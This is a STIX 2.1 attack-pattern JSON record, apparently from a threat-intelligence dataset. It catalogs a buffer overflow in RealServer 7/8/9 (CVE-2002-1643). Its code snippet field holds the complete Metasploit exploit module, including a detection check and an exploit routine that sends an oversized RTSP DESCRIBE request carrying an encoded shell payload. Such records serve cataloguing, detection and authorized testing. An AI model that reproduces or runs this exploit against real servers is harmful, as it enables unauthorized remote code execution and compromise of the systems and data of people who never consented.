{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8fce9c42-4240-41ae-abdf-a93336967133",
    "created": "2024-08-14T17:07:16.0532Z",
    "modified": "2024-08-14T17:07:16.053205Z",
    "name": "RealServer Describe Buffer Overflow",
    "description": " This module exploits a buffer overflow in RealServer 7/8/9 and was based on Johnny Cyberpunk's THCrealbad exploit. This code should reliably exploit Linux, BSD, and Windows-based servers. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/realserver/describe.rb",
            "external_id": "describe.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2002-1643"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'RealServer Describe Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a buffer overflow in RealServer 7/8/9\n        and was based on Johnny Cyberpunk's THCrealbad exploit. This\n        code should reliably exploit Linux, BSD, and Windows-based\n        servers.\n      },\n      'Author'         => 'hdm',\n      'References'     =>\n        [\n          [ 'CVE', '2002-1643' ],\n          [ 'OSVDB', '4468']\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 2000,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x25\\x2e\\x2f\\x5c\\xff\\x20\\x3a\\x26\\x3f\\x2e\\x3d\"\n        },\n      'Platform'       => %w{ bsd linux win },\n      'Targets'        =>\n        [\n          [\n            'Universal',\n            {\n              'Platform' => %w{ bsd linux win }\n            },\n          ],\n        ],\n      'DisclosureDate' => '2002-12-20',\n      'DefaultTarget' => 0))\n  end\n\n  def check\n    res = send_request_raw(\n      {\n        'method' => 'OPTIONS',\n        'proto'  => 'RTSP',\n        'version' => '1.0',\n        'uri'    => '/'\n      }, 5)\n\n    info = http_fingerprint({ :response => res })  # check method / Custom server check\n    if res and res['Server']\n      vprint_status(\"Found RTSP: #{res['Server']}\")\n      return Exploit::CheckCode::Detected\n    end\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    print_status(\"RealServer universal exploit launched against #{rhost}\")\n    print_status(\"Kill the master rmserver pid to prevent shell disconnect\")\n\n    encoded = Rex::Text.to_hex(payload.encoded, \"%\")\n\n    res = send_request_raw({\n      'method' => 'DESCRIBE',\n      'proto'  => 'RTSP',\n      'version' => '1.0',\n      'uri'    => \"/\" + (\"../\" * 560) + \"\\xcc\\xcc\\x90\\x90\" + encoded + \".smi\"\n    }, 5)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2002-12-20",
    "x_mitre_platforms": [
        "%w{ bsd linux win }"
    ]
}